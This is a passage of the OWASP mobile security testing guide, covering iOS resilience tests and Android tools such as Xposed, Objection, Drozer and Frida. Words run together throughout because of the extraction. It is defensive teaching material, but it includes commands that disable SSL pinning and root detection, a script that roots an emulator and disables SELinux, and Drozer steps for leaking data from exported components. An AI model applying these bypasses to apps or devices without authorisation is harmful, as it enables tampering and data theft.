SinceiOS7.0,hardwareidentifiers(suchasMACaddresses)areoff-limitsbutthereareothermethodsforimplementing devicebindinginiOS: • identifierForVendor: You can use [[UIDevice currentDevice] identifierForVendor] (in Objective- C), UIDevice.current.identifierForVendor?.uuidString (in Swift3), or UIDevice.currentDevice(). identifierForVendor?.UUIDString(inSwift2). ThevalueofidentifierForVendormaynotbethesameifyou reinstall the app after other apps from the same vendor are installed and it may change when you update your appbundle’sname. ThereforeitisbesttocombineitwithsomethingintheKeychain. • UsingtheKeychain: YoucanstoresomethingintheKeychaintoidentifytheapplication’sinstance. Tomakesure thatthisdataisnotbackedup,usekSecAttrAccessibleWhenPasscodeSetThisDeviceOnly(ifyouwanttosecure thedataandproperlyenforceapasscodeorTouchIDrequirement),kSecAttrAccessibleAfterFirstUnlockThis- DeviceOnly,orkSecAttrAccessibleWhenUnlockedThisDeviceOnly. • UsingGoogleInstanceID:seetheimplementationforiOShere. Anyschemebasedonthesemethodswillbemoresecurethemomentapasscodeand/orTouchIDisenabled,themate- rials stored in the Keychain or filesystem are protected with protection classes (such as kSecAttrAccessibleAfter- FirstUnlockThisDeviceOnly and kSecAttrAccessibleWhenUnlockedThisDeviceOnly), and the SecAccessControl- CreateFlagsisseteitherwithkSecAccessControlDevicePasscode(forpasscodes),kSecAccessControlUserPresence (passcode, Face ID or Touch ID), kSecAccessControlBiometryAny (Face ID or Touch ID) or kSecAccessControlBiome- tryCurrentSet(FaceID/TouchID:butcurrentenrolledbiometricsonly). Testing for Debugging Code and Verbose Error Logging Platform: ios MASVSV1: MSTG-CODE-4 MASVSV2: MASVS-RESILIENCE-3 516\nOverview Static Analysis Youcantakethefollowingstaticanalysisapproachfortheloggingstatements: 1. Importtheapplication’scodeintoXcode. 2. Searchthecodeforthefollowingprintingfunctions: NSLog,println,print,dump,debugPrint. 3. Whenyoufindoneofthem,determinewhetherthedevelopersusedawrappingfunctionaroundtheloggingfunction forbettermarkupofthestatementstobelogged;ifso,addthatfunctiontoyoursearch. 4. Foreveryresultofsteps2and3,determinewhethermacrosordebug-staterelatedguardshavebeensettoturn theloggingoffinthereleasebuild. PleasenotethechangeinhowObjective-Ccanusepreprocessormacros: ##ifdefDEBUG //Debug-onlycode ##endif The procedure for enabling this behavior in Swift has changed: you need to either set environment variables in your schemeorsetthemascustomflagsinthetarget’sbuildsettings. Pleasenotethatthefollowingfunctions(whichallow youtodeterminewhethertheappwasbuiltintheSwift2.1. release-configuration)aren’trecommended,asXcode8and Swift3don’tsupportthesefunctions: • _isDebugAssertConfiguration • _isReleaseAssertConfiguration • _isFastAssertConfiguration. Dependingontheapplication’ssetup,theremaybemoreloggingfunctions. Forexample,whenCocoaLumberjackisused, staticanalysisisabitdifferent. Forthe“debug-management”code(whichisbuilt-in): inspectthestoryboardstoseewhetherthereareanyflowsand/or view-controllersthatprovidefunctionalitydifferentfromthefunctionalitytheapplicationshouldsupport. Thisfunctionality canbeanythingfromdebugviewstoprintederrormessages,fromcustomstub-responseconfigurationstologswritten tofilesontheapplication’sfilesystemoraremoteserver. Asadeveloper,incorporatingdebugstatementsintoyourapplication’sdebugversionshouldnotbeaproblemaslongas youmakesurethatthedebugstatementsareneverpresentintheapplication’sreleaseversion. InObjective-C,developerscanusepreprocessormacrostofilteroutdebugcode: ##ifdefDEBUG //Debug-onlycode ##endif InSwift2(withXcode7), youhavetosetcustomcompilerflagsforeverytarget, andcompilerflagshavetostartwith “-D”.SoyoucanusethefollowingannotationswhenthedebugflagDMSTG-DEBUGisset: ##ifMSTG-DEBUG //Debug-onlycode ##endif InSwift3(withXcode8),youcansetActiveCompilationConditionsinBuildsettings/Swiftcompiler-Customflags. Instead ofapreprocessor,Swift3usesconditionalcompilationblocksbasedonthedefinedconditions: ##ifDEBUG_LOGGING //Debug-onlycode ##endif Dynamic Analysis Dynamicanalysisshouldbeexecutedonbothasimulatorandadevicebecausedeveloperssometimesusetarget-based functions(insteadoffunctionsbasedonarelease/debug-mode)toexecutethedebuggingcode. 517\n1. Runtheapplicationonasimulatorandcheckforoutputintheconsoleduringtheapp’sexecution. 2. AttachadevicetoyourMac,runtheapplicationonthedeviceviaXcode,andcheckforoutputintheconsoleduring theapp’sexecution. Fortheother“manager-based”debugcode: clickthroughtheapplicationonbothasimulatorandadevicetoseeifyou can find any functionality that allows an app’s profiles to be pre-set, allows the actual server to be selected or allows responsesfromtheAPItobeselected. Testing Anti-Debugging Detection Platform: ios MASVSV1: MSTG-RESILIENCE-2 MASVSV2: MASVS-RESILIENCE-4 Overview Inordertotestforanti-debuggingdetectionyoucantrytoattachadebuggertotheappandseewhathappens. Theappshouldrespondinsomeway. Forexampleby: • Alertingtheuserandaskingforacceptingliability. • Preventingexecutionbygracefullyterminating. • Securelywipinganysensitivedatastoredonthedevice. • Reportingtoabackendserver,e.g,forfrauddetection. Trytohookorreverseengineertheappusingthemethodsfromsection“Anti-DebuggingDetection”. Next,workonbypassingthedetectionandanswerthefollowingquestions: • Canthemechanismsbebypassedtrivially(e.g.,byhookingasingleAPIfunction)? • Howdifficultisidentifyingthedetectioncodeviastaticanddynamicanalysis? • Didyouneedtowritecustomcodetodisablethedefenses? Howmuchtimedidyouneed? • Whatisyourassessmentofthedifficultyofbypassingthemechanisms? Testing Jailbreak Detection Platform: ios MASVSV1: MSTG-RESILIENCE-1 MASVSV2: MASVS-RESILIENCE-1 Overview Totestforjailbreakdetectioninstalltheapponajailbrokendevice. Launchtheappandseewhathappens: Ifitimplementsjailbreakdetection,youmightnoticeoneofthefollowingthings: • Theappcrashesandclosesimmediately,withoutanynotification. • Apop-upwindowindicatesthattheappwon’trunonajailbrokendevice. Notethatcrashesmightbeanindicatorofjailbreakdetectionbuttheappmaybecrashingforanyotherreasons,e.g.itmay haveabug. Werecommendtotesttheapponnon-jailbrokendevicefirst,especiallywhenyou’retestingpreproduction versions. LaunchtheappandtrytobypassJailbreakDetectionusinganautomatedtool: 518\nIf it implements jailbreak detection, you might be able to see indicators of that in the output of the tool. See section “AutomatedJailbreakDetectionBypass”. ReverseEngineertheapp: Theappmightbeusingtechniquesthatarenotimplementedintheautomatedtoolsthatyou’veused. Ifthat’sthecase youmustreverseengineertheapptofindproofs. Seesection“ManualJailbreakDetectionBypass”. Testing whether the App is Debuggable Platform: ios MASVSV1: MSTG-CODE-2 MASVSV2: MASVS-RESILIENCE-4 Overview Static Analysis Inspecttheappentitlementsandcheckthevalueofget-task-allowkey. Ifitissettotrue,theappisdebuggable. Usingcodesign: $codesign -d--entitlements -iGoat-Swift.app Executable=/Users/owasp/iGoat-Swift/Payload/iGoat-Swift.app/iGoat-Swift [Dict] [Key]application-identifier [Value] [String]TNAJ496RHB.OWASP.iGoat-Swift [Key]com.apple.developer.team-identifier [Value] [String]TNAJ496RHB [Key]get-task-allow [Value] [Bool]true [Key]keychain-access-groups [Value] [Array] [String]TNAJ496RHB.OWASP.iGoat-Swift Usingldid: $ldid-eiGoat-Swift.app/iGoat-Swift <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE plist PUBLIC"-//Apple//DTDPLIST1.0//EN""http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0"> <dict> <key>application-identifier</key> <string>TNAJ496RHB.OWASP.iGoat-Swift</string> <key>com.apple.developer.team-identifier</key> <string>TNAJ496RHB</string> <key>get-task-allow</key> <true/> <key>keychain-access-groups</key> <array> <string>TNAJ496RHB.OWASP.iGoat-Swift</string> </array> </dict> </plist> Dynamic Analysis Checkwhetheryoucanattachadebuggerdirectly, usingXcode. Next, checkifyoucandebugtheapponajailbroken deviceafterClutchingit. Thisisdoneusingthedebug-serverwhichcomesfromtheBigBossrepositoryatCydia. Note: if the application is equipped with anti-reverse engineering controls, then the debugger can be detected and stopped. 519\nTesting Obfuscation Platform: ios MASVSV1: MSTG-RESILIENCE-9 MASVSV2: MASVS-RESILIENCE-3 Overview Attempt to disassemble the Mach-O in the IPA and any included library files in the “Frameworks” directory (.dylib or .frameworkfiles),andperformstaticanalysis. Attheveryleast,theapp’scorefunctionality(i.e.,thefunctionalitymeant tobeobfuscated)shouldn’tbeeasilydiscerned. Verifythat: • meaningfulidentifiers,suchasclassnames,methodnames,andvariablenames,havebeendiscarded. • stringresourcesandstringsinbinariesareencrypted. • codeanddatarelatedtotheprotectedfunctionalityisencrypted,packed,orotherwiseconcealed. Foramoredetailedassessment,youneedadetailedunderstandingoftherelevantthreatsandtheobfuscationmethods used. Testing Reverse Engineering Tools Detection Platform: ios MASVSV1: MSTG-RESILIENCE-4 MASVSV2: MASVS-RESILIENCE-4 Overview Launchtheappwithvariousreverseengineeringtoolsandframeworksinstalledonyourtestdevice,suchasFrida,Cydia Substrate,CycriptorSSLKillSwitch. Theappshouldrespondinsomewaytothepresenceofthosetools. Forexampleby: • Alertingtheuserandaskingforacceptingliability. • Preventingexecutionbygracefullyterminating. • Securelywipinganysensitivedatastoredonthedevice. • Reportingtoabackendserver,e.g,forfrauddetection. Next,workonbypassingthedetectionofthereverseengineeringtoolsandanswerthefollowingquestions: • Canthemechanismsbebypassedtrivially(e.g.,byhookingasingleAPIfunction)? • Howdifficultisidentifyingthedetectioncodeviastaticanddynamicanalysis? • Didyouneedtowritecustomcodetodisablethedefenses? Howmuchtimedidyouneed? • Whatisyourassessmentofthedifficultyofbypassingthemechanisms? Testing for Debugging Symbols Platform: ios MASVSV1: MSTG-CODE-3 MASVSV2: MASVS-RESILIENCE-3 520\nOverview Static Analysis To verify the existence of debug symbols you can use objdump from binutils or llvm-objdump to inspect all of the app binaries. InthefollowingsnippetwerunobjdumpoverTargetApp(theiOSmainappexecutable)toshowthetypicaloutputofa binarycontainingdebugsymbolswhicharemarkedwiththed(debug)flag. Checktheobjdumpmanpageforinformation aboutvariousothersymbolflagcharacters. $objdump --syms TargetApp 0000000100007dc8l d *UND*-[ViewController handleSubmitButton:] 000000010000809cl d *UND*-[ViewController touchesBegan:withEvent:] 0000000100008158l d *UND*-[ViewController viewDidLoad] ... 000000010000916cl d *UND*_disable_gdb 00000001000091d8l d *UND*_detect_injected_dylds 00000001000092a4l d *UND*_isDebugged ... Topreventtheinclusionofdebugsymbols,setStrip Debug Symbols During CopytoYESviatheXCodeproject’sbuild settings. Strippingdebuggingsymbolswillnotonlyreducethesizeofthebinarybutalsoincreasethedifficultyofreverse engineering. Dynamic Analysis Dynamicanalysisisnotapplicableforfindingdebuggingsymbols. Testing Emulator Detection Platform: ios MASVSV1: MSTG-RESILIENCE-5 MASVSV2: MASVS-RESILIENCE-1 Overview Inordertotestforemulatordetectionyoucantrytoruntheappondifferentemulatorsasindicatedinsection“Emulator Detection”andseewhathappens. Theappshouldrespondinsomeway. Forexampleby: • Alertingtheuserandaskingforacceptingliability. • Preventingexecutionbygracefullyterminating. • Reportingtoabackendserver,e.g,forfrauddetection. Youcanalsoreverseengineertheappusingideasforstringsandmethodsfromsection“EmulatorDetection”. Next,workonbypassingthisdetectionandanswerthefollowingquestions: • Canthemechanismsbebypassedtrivially(e.g.,byhookingasingleAPIfunction)? • Howdifficultisidentifyingthedetectioncodeviastaticanddynamicanalysis? • Didyouneedtowritecustomcodetodisablethedefenses? Howmuchtimedidyouneed? • Whatisyourassessmentofthedifficultyofbypassingthemechanisms? Testing File Integrity Checks 521\nPlatform: ios MASVSV1: MSTG-RESILIENCE-3,MSTG-RESILIENCE-11 MASVSV2: MASVS-RESILIENCE-2 Overview ApplicationSourceCodeIntegrityChecks: Run the app on the device in an unmodified state and make sure that everything works. Then apply patches to the executableusingoptool,re-signtheappasdescribedinthechapter“iOSTamperingandReverseEngineering”,andrun it. Theappshouldrespondinsomeway. Forexampleby: • Alertingtheuserandaskingforacceptingliability. • Preventingexecutionbygracefullyterminating. • Securelywipinganysensitivedatastoredonthedevice. • Reportingtoabackendserver,e.g,forfrauddetection. Workonbypassingthedefensesandanswerthefollowingquestions: • Canthemechanismsbebypassedtrivially(e.g.,byhookingasingleAPIfunction)? • Howdifficultisidentifyingthedetectioncodeviastaticanddynamicanalysis? • Didyouneedtowritecustomcodetodisablethedefenses? Howmuchtimedidyouneed? • Whatisyourassessmentofthedifficultyofbypassingthemechanisms? FileStorageIntegrityChecks: Gototheappdatadirectoriesasindicatedinsection“AccessingAppDataDirectories”andmodifysomefiles. Next,workonbypassingthedefensesandanswerthefollowingquestions: • Canthemechanismsbebypassedtrivially(e.g.,bychangingthecontentsofafileorakey-valuepair)? • HowdifficultisobtainingtheHMACkeyortheasymmetricprivatekey? • Didyouneedtowritecustomcodetodisablethedefenses? Howmuchtimedidyouneed? • Whatisyourassessmentofthedifficultyofbypassingthemechanisms? Making Sure that the App Is Properly Signed Platform: ios MASVSV1: MSTG-CODE-1 MASVSV2: MASVS-RESILIENCE-2 Overview Static Analysis Youhavetoensurethattheappisusingthelatestcodesignatureformat. Youcanretrievethesigningcertificateinfor- mationfromtheapplication’s.appfilewithcodesign. Codesignisusedtocreate,check,anddisplaycodesignatures,as wellasinquireintothedynamicstatusofsignedcodeinthesystem. Afteryougettheapplication’sIPAfile,re-saveitasaZIPfileanddecompresstheZIPfile. NavigatetothePayloaddirectory, wheretheapplication’s.appfilewillbe. Executethefollowingcodesigncommandtodisplaythesigninginformation: 522\n$codesign -dvvv YOURAPP.app Executable=/Users/Documents/YOURAPP/Payload/YOURAPP.app/YOURNAME Identifier=com.example.example Format=appbundlewithMach-Ouniversal (armv7arm64) CodeDirectoryv=20200size=154808flags=0x0(none)hashes=4830+5 location=embedded Hashtype=sha256size=32 CandidateCDHashsha1=455758418a5f6a878bb8fdb709ccfca52c0b5b9e CandidateCDHashsha256=fd44efd7d03fb03563b90037f92b6ffff3270c46 Hashchoices=sha1,sha256 CDHash=fd44efd7d03fb03563b90037f92b6ffff3270c46 Signaturesize=4678 Authority=iPhoneDistribution:ExampleLtd Authority=AppleWorldwideDeveloperRelationsCertificationAuthority Authority=AppleRootCA SignedTime=4Aug2017,12:42:52 Info.plistentries=66 TeamIdentifier=8LAMR92KJ8 SealedResourcesversion=2rules=12files=1410 Internalrequirementscount=1size=176 TherearevariouswaystodistributeyourappasdescribedattheAppledocumentation,whichincludeusingtheAppStore orviaAppleBusinessManagerforcustomorin-housedistribution. Incaseofanin-housedistributionscheme,makesure thatnoadhoccertificatesareusedwhentheappissignedfordistribution. 523\nTesting Tools The OWASP MASTG includes many tools to assist you in executing test cases, allowing you to perform static analysis, dynamic analysis, dynamic instrumentation, etc. These tools are meant to help you conduct your own assessments, rather than provide a conclusive result on an application’s security status. It’s essential to carefully review the tools’ output,asitcancontainbothfalsepositivesandfalsenegatives. The goal of the MASTG is to be as accessible as possible. For this reason, we prioritize including tools that meet the followingcriteria: • Open-source • Freetouse • CapableofanalyzingrecentAndroid/iOSapplications • Regularlyupdated • Strongcommunitysupport Ininstanceswherenosuitableopen-sourcealternativeexists,wemayincludeclosed-sourcetools. However,anyclosed- sourcetoolsincludedmustbefreetouse,asweaimtoavoidfeaturingpaidtoolswheneverpossible. Thisalsoextends tofreewareorcommunityeditionsofcommercialtools. Ourgoalistobevendor-neutralandtoserveasatrustedlearningresource,sothespecificcategoryof“automatedmobile applicationsecurityscanners”presentsauniquechallenge. Forthisreason,wehavehistoricallyavoidedincludingsuch toolsduetothecompetitivedisadvantagestheycancreateamongvendors. Incontrast, weprioritizetoolslikeMobSF thatprovidefullaccesstotheircodeandacomprehensivesetoftests,makingthemexcellentforeducationalpurposes. Toolsthatlackthisleveloftransparency,eveniftheyofferafreeversion,generallydonotmeettheinclusioncriteriaof theOWASPMASproject. Disclaimer: Each tool included in the MASTG examples was verified to be functional at the time it was added. However,thetoolsmaynotworkproperlydependingontheOSversionofbothyourhostcomputerandyourtest device. Thefunctionalityofthetoolscanalsobeaffectedbywhetheryou’reusingarootedorjailbrokendevice,the specific version of the rooting or jailbreaking method, and/or the tool version itself. The OWASP MASTG does not assumeanyresponsibilityfortheoperationalstatusofthesetools. Ifyouencounterabrokentoolorexample,we recommendsearchingonlineforasolutionorcontactingthetool’sproviderdirectly. IfthetoolhasaGitHubpage, youmayalsoopenanissuethere. gplaycli Platform: android Availableat: https://github.com/matlink/gplaycli gplaycliisaPythonbasedCLItooltosearch,installandupdateAndroidapplicationsfromtheGooglePlayStore. Follow the installation steps and you’re ready to run it. gplaycli offers several options, please refer to its help (-h) for more information. Ifyou’reunsureaboutthepackagename(orAppID)ofanapp,youmayperformakeywordbasedsearchforAPKs(-s): $gplaycli -s"googlekeep" Title Creator Size LastUpdate AppID Version GoogleKeep -notesandlists GoogleLLC 15.78MB 4Sep2019 com.google.android.keep 193510330 Maps -Navigate & Explore GoogleLLC 35.25MB 16May2019 com.google.android.apps.maps 1016200134 Google GoogleLLC 82.57MB 30Aug2019 com.google.android.googlequicksearchbox 301008048 Notethatregional(GooglePlay)restrictionsapplywhenusinggplaycli. Inordertoaccessappsthatarerestricted inyourcountryyoucanusealternativeappstoressuchastheonesdescribedin“AlternativeAppStores”. Xposed 524\nPlatform: android Availableat: https://github.com/ElderDrivers/EdXposed Xposed does not work on Android 9 (API level 28). However, it was unofficially ported in 2019 under the name EdXposed,supportingAndroid8-10(APIlevel26till29). YoucanfindthecodeandusageexamplesatEdXposed Githubrepo. Xposedisaframeworkthatallowstomodifythesystemorapplicationaspectandbehavioratruntime,withoutmodifying anyAndroidapplicationpackage(APK)orre-flashing. Technically,itisanextendedversionofZygotethatexportsAPIs for running Java code when a new process is started. Running Java code in the context of the newly instantiated app makesitpossibletoresolve,hook,andoverrideJavamethodsbelongingtotheapp. Xposedusesreflectiontoexamine and modify the running app. Changes are applied in memory and persist only during the process’ runtime since the applicationbinariesarenotmodified. TouseXposed,youneedtofirstinstalltheXposedframeworkonarooteddeviceasexplainedonXDA-DevelopersXposed frameworkhub. ModulescanbeinstalledthroughtheXposedInstallerapp,andtheycanbetoggledonandoffthrough theGUI. Note: given that a plain installation of the Xposed framework is easily detected with SafetyNet, we recommend using MagisktoinstallXposed. Thisway,applicationswithSafetyNetattestationshouldhaveahigherchanceofbeingtestable withXposedmodules. XposedhasbeencomparedtoFrida. WhenyourunFridaserveronarooteddevice,youwillendupwithasimilarlyeffective setup. Both frameworks deliver a lot of value when you want to do dynamic instrumentation. When Frida crashes the app,youcantrysomethingsimilarwithXposed. Next,similartotheabundanceofFridascripts,youcaneasilyuseone ofthemanymodulesthatcomewithXposed, suchastheearlierdiscussedmoduletobypassSSLpinning(JustTrustMe andSSLUnpinning). Xposedincludesothermodules,suchasInspeckagewhichallowyoutodomoreindepthapplication testing as well. On top of that, you can create your own modules as well to patch often used security mechanisms of Androidapplications. Xposedcanalsobeinstalledonanemulatorthroughthefollowingscript: ##!/bin/sh echo "Startyouremulatorwith'emulator-avdNAMEOFX86A8.0-writable-system-selinuxpermissive-wipe-data'" adbroot && adbremount adbinstallSuperSU\v2.79.apk #binarycanbedownloadedfromhttp://www.supersu.com/download adbpushroot_avd-master/SuperSU/x86/su/system/xbin/su adbshellchmod0755/system/xbin/su adbshellsetenforce0 adbshellsu --install adbshellsu --daemon& adbpushbusybox/data/busybox #binarycanbedownloadedfromhttps://busybox.net/ ##adbshell"mount-oremount,rw/system&&mv/data/busybox/system/bin/busybox&&chmod755/system/bin/busybox&&/system/bin/busybox--install/system/bin" adbshellchmod755/data/busybox adbshell 'sh-c"./data/busybox--install/data"' adbshell 'sh-c"mkdir/data/xposed"' adbpushxposed8.zip/data/xposed/xposed.zip #canbedownloadedfromhttps://dl-xda.xposed.info/framework/ adbshellchmod0755/data/xposed adbshell 'sh-c"./data/unzip/data/xposed/xposed.zip-d/data/xposed/"' adbshell 'sh-c"cp/data/xposed/xposed/META-INF/com/google/android/*.*/data/xposed/xposed/"' echo "Nowadbshellanddo'su',next:goto./data/xposed/xposed,makeflash-script.shexecutableandrunitinthatdirectoryafter runningSUperSU" echo "Next,restartemulator" echo "Next,adbinstallXposedInstaller_3.1.5.apk" echo "Next,runinstallerandthenadbreboot" echo "Wanttouseitagain?Startyouremulatorwith'emulator-avdNAMEOFX86A8.0-writable-system-selinuxpermissive'" APKiD Platform: android Availableat: https://github.com/rednaga/APKiD APKiDgivesyouinformationabouthowanAPKwasmade. Itidentifiesmanycompilers,packers,obfuscators,andother weirdstuff. Formoreinformationonwhatthistoolcanbeusedfor,checkout: 525\n• AndroidCompilerFingerprinting • DetectingPiratedandMaliciousAndroidAppswithAPKiD • APKiD:PEiDforAndroidApps • APKiD:FastIdentificationofAppShieldingProducts JustTrustMe Platform: android Availableat: https://github.com/Fuzion24/JustTrustMe AnXposedModuletobypassSSLcertificatepinning-https://github.com/Fuzion24/JustTrustMe objection for Android Platform: android Availableat: https://github.com/sensepost/objection ObjectionoffersseveralfeaturesspecifictoAndroid. Youcanfindthefulllistoffeaturesontheproject’spage,buthere areafewinterestingones: • RepackageapplicationstoincludetheFridagadget • DisableSSLpinningforpopularmethods • Accessapplicationstoragetodownloadoruploadfiles • ExecutecustomFridascripts • ListtheActivities,ServicesandBroadcastreceivers • StartActivities Ifyouhavearooteddevicewithfrida-serverinstalled,ObjectioncanconnectdirectlytotherunningFridaservertoprovide allitsfunctionalitywithoutneedingtorepackagetheapplication. However, itisnotalwayspossibletorootanAndroid deviceortheappmaycontainadvancedRASPcontrolsforrootdetection,soinjectingafrida-gadgetmaybetheeasiest waytobypassthosecontrols. Theabilitytoperformadvanceddynamicanalysisonnon-rooteddevicesisoneofthefeaturesthatmakesObjection incrediblyuseful. Afterfollowingtherepackagingprocessyouwillbeabletorunalltheaforementionedcommandswhich makeitveryeasytoquicklyanalyzeanapplication,orbypassbasicsecuritycontrols. Using Objection on Android Starting up Objection depends on whether you’ve patched the APK or whether you are using a rooted device running Frida-server. ForrunningapatchedAPK,objectionwillautomaticallyfindanyattacheddevicesandsearchforalistening Frida gadget. However, when using frida-server, you need to explicitly tell frida-server which application you want to analyze. ##ConnectingtoapatchedAPK objectionexplore ##Findthecorrectnameusingfrida-ps $frida-ps -Ua|grep -itelegram 30268 Telegram org.telegram.messenger ##ConnectingtotheTelegramappthroughFrida-server $objection --gadget="org.telegram.messenger" explore OnceyouareintheObjectionREPL,youcanexecuteanyoftheavailablecommands. Belowisanoverviewofsomeof themostusefulones: 526\n##Showthedifferentstoragelocationsbelongingtotheapp $env ##Disablepopularsslpinningmethods $androidsslpinningdisable ##Listitemsinthekeystore $androidkeystorelist ##Trytocircumventrootdetection $androidrootdisable MoreinformationonusingtheObjectionREPLcanbefoundontheObjectionWiki Drozer Platform: android Availableat: https://github.com/FSecureLABS/drozer Drozer is an Android security assessment framework that allows you to search for security vulnerabilities in apps and devicesbyassumingtheroleofathird-partyappinteractingwiththeotherapplication’sIPCendpointsandtheunderlying OS. The advantage of using drozer consists on its ability to automate several tasks and that it can be expanded through modules. Themodulesareveryhelpfulandtheycoverdifferentcategoriesincludingascannercategorythatallowsyou toscanforknowndefectswithasimplecommandsuchasthemodulescanner.provider.injectionwhichdetectsSQL injections in content providers in all the apps installed in the system. Without drozer, simple tasks such as listing the app’spermissionsrequireseveralstepsthatincludedecompilingtheAPKandmanuallyanalyzingtheresults. Installing Drozer You can refer to drozer GitHub page (for Linux and Windows, for macOS please refer to this blog post) and the drozer websiteforprerequisitesandinstallationinstructions. Using Drozer Beforeyoucanstartusingdrozer,you’llalsoneedthedrozeragentthatrunsontheAndroiddeviceitself. Downloadthe latestdrozeragentfromtheGitHubreleasespageandinstallitwithadb install drozer.apk. OncethesetupiscompletedyoucanstartasessiontoanemulatororadeviceconnectedperUSBbyrunningadbforward tcp:31415 tcp:31415anddrozer console connect. Thisiscalleddirectmodeandyoucanseethefullinstructionsin the User Guide in section “Starting a Session”. An alternative is to run Drozer in infrastructure mode, where, you are runningadrozerserverthatcanhandlemultipleconsolesandagents,androutessessionsbetweenthem. Youcanfind thedetailsofhowtosetupdrozerinthismodeinthe“InfrastructureMode”sectionoftheUserGuide. Nowyouarereadytobeginanalyzingapps. Agoodfirststepistoenumeratetheattacksurfaceofanappwhichcanbe doneeasilywiththefollowingcommand: dz>runapp.package.attacksurface <package> Again, withoutdrozerthiswouldhaverequiredseveralsteps. Themoduleapp.package.attacksurfacelistsactivities, broadcastreceivers,contentprovidersandservicesthatareexported,hence,theyarepublicandcanbeaccessedthrough otherapps. Oncewehaveidentifiedourattacksurface,wecaninteractwiththeIPCendpointsthroughdrozerwithout havingtowriteaseparatestandaloneappasitwouldberequiredforcertaintaskssuchascommunicatingwithacontent provider. Forexample,iftheapphasanexportedActivitythatleakssensitiveinformationwecaninvokeitwiththeDrozermodule app.activity.start: 527\ndz>runapp.activity.start --component <package><componentname> Thispreviouscommandwillstarttheactivity,hopefullyleakingsomesensitiveinformation. Drozerhasmodulesforevery typeofIPCmechanism. DownloadInsecureBankv2ifyouwouldliketotrythemoduleswithanintentionallyvulnerable applicationthatillustratescommonproblemsrelatedtoIPCendpoints. Paycloseattentiontothemodulesinthescanner category as they are very helpful automatically detecting vulnerabilities even in system packages, specially if you are usingaROMprovidedbyyourcellphonecompany. EvenSQLinjectionvulnerabilitiesinsystempackagesbyGooglehave beenidentifiedinthepastwithdrozer. Other Drozer commands Here’sanon-exhaustivelistofcommandsyoucanusetostartexploringonAndroid: ##Listalltheinstalledpackages $dz>runapp.package.list ##Findthepackagenameofaspecificapp $dz>runapp.package.list -f(stringtobesearched) ##Seebasicinformation $dz>runapp.package.info -a(packagename) ##Identifytheexportedapplicationcomponents $dz>runapp.package.attacksurface (packagename) ##IdentifythelistofexportedActivities $dz>runapp.activity.info -a(packagename) ##LaunchtheexportedActivities $dz>runapp.activity.start --component (packagename)(componentname) ##IdentifythelistofexportedBroadcastreceivers $dz>runapp.broadcast.info -a(packagename) ##SendamessagetoaBroadcastreceiver $dz>runapp.broadcast.send --action (broadcastreceivername)--extra (numberofarguments) ##DetectSQLinjectionsincontentproviders $dz>runscanner.provider.injection -a(packagename) Other Drozer resources Otherresourceswhereyoumightfindusefulinformationare: • OfficialdrozerUserGuide. • drozerGitHubpage • drozerWiki Scrcpy Platform: android Availableat: https://github.com/Genymobile/scrcpy ScrcpyprovidesdisplayandcontrolofAndroiddevicesconnectedoverUSB(orTCP/IP).Itdoesnotrequireanyrootaccess anditworksonGNU/Linux,WindowsandmacOS. Android Studio Platform: android TheofficialIDEforGoogle’sAndroidoperatingsystem,builtonJetBrains’IntelliJIDEAsoftwareanddesignedspecifically forAndroiddevelopment-https://developer.android.com/studio/index.html 528\nFrida for Android Platform: android FridasupportsinteractionwiththeAndroidJavaruntimethoughtheJavaAPI.You’llbeabletohookandcallbothJavaand nativefunctionsinsidetheprocessanditsnativelibraries. YourJavaScriptsnippetshavefullaccesstomemory,e.g.to readand/orwriteanystructureddata. HerearesometasksthatFridaAPIsoffersandarerelevantorexclusiveonAndroid: • InstantiateJavaobjectsandcallstaticandnon-staticclassmethods(JavaAPI). • ReplaceJavamethodimplementations(JavaAPI). • EnumerateliveinstancesofspecificclassesbyscanningtheJavaheap(JavaAPI). • Scanprocessmemoryforoccurrencesofastring(MemoryAPI). • Interceptnativefunctioncallstorunyourowncodeatfunctionentryandexit(InterceptorAPI). RememberthatonAndroid,youcanalsobenefitfromthebuilt-intoolsprovidedwheninstallingFrida,thatincludesthe FridaCLI(frida),frida-ps,frida-ls-devicesandfrida-trace,tonamesomeofthem. Frida is often compared to Xposed, however this comparison is far from fair as both frameworks were designed with differentgoalsinmind. Thisisimportanttounderstandasanappsecuritytestersothatyoucanknowwhichframework touseinwhichsituation: • Fridaisstandalone,allyouneedistorunthefrida-serverbinaryfromaknownlocationinyourtargetAndroiddevice (see“InstallingFrida”below). Thismeansthat,incontrasttoXposed,itisnotdeepinstalledinthetargetOS. • Reversinganappisaniterativeprocess. Asaconsequenceofthepreviouspoint, youobtainashorterfeedback loopwhentestingasyoudon’tneedto(soft)reboottoapplyorsimplyupdateyourhooks. Soyoumightpreferto useXposedwhenimplementingmorepermanenthooks. • You may inject and update your Frida JavaScript code on the fly at any point during the runtime of your process (similarlytoCycriptoniOS).Thiswayyoucanperformtheso-calledearlyinstrumentationbylettingFridaspawn yourapporyoumayprefertoattachtoarunningappthatyoumighthavebroughttoacertainstate. • FridaisabletohandlebothJavaaswellasnativecode(JNI),allowingyoutomodifybothofthem. Thisisunfortu- natelyalimitationofXposedwhichlacksofnativecodesupport. NotethatXposed,asofearly2019,doesnotworkonAndroid9(APIlevel28)yet. Installing Frida on Android InordertosetupFridaonyourAndroiddevice: • Ifyourdeviceisnotrooted,youcanalsouseFrida,pleaserefertosection“DynamicAnalysisonNon-RootedDevices” ofthe“ReverseEngineeringandTampering”chapter. • Ifyouhavearooteddevice,simplyfollowtheofficialinstructionsorfollowthehintsbelow. Weassumearooteddevicehereunlessotherwisenoted. Downloadthefrida-serverbinaryfromtheFridareleasespage. Makesurethatyoudownloadtherightfrida-serverbinaryforthearchitectureofyourAndroiddeviceoremulator: x86, x86_64,armorarm64. Makesurethattheserverversion(atleastthemajorversionnumber)matchestheversionofyour localFridainstallation. PyPIusuallyinstallsthelatestversionofFrida. Ifyou’reunsurewhichversionisinstalled,youcan checkwiththeFridacommandlinetool: frida --version OryoucanrunthefollowingcommandtoautomaticallydetectFridaversionanddownloadtherightfrida-serverbinary: wget https://github.com/frida/frida/releases/download/$(frida --version)/frida-server-$(frida --version)-android-arm.xz Copyfrida-servertothedeviceandrunit: 529\nadbpushfrida-server/data/local/tmp/ adbshell "chmod755/data/local/tmp/frida-server" adbshell "su-c/data/local/tmp/frida-server&" Using Frida on Android Withfrida-serverrunning,youshouldnowbeabletogetalistofrunningprocesseswiththefollowingcommand(usethe -UoptiontoindicateFridatouseaconnectedUSBdevicesoremulator): $frida-ps -U PID Name ----- -------------------------------------------------------------- 276 adbd 956 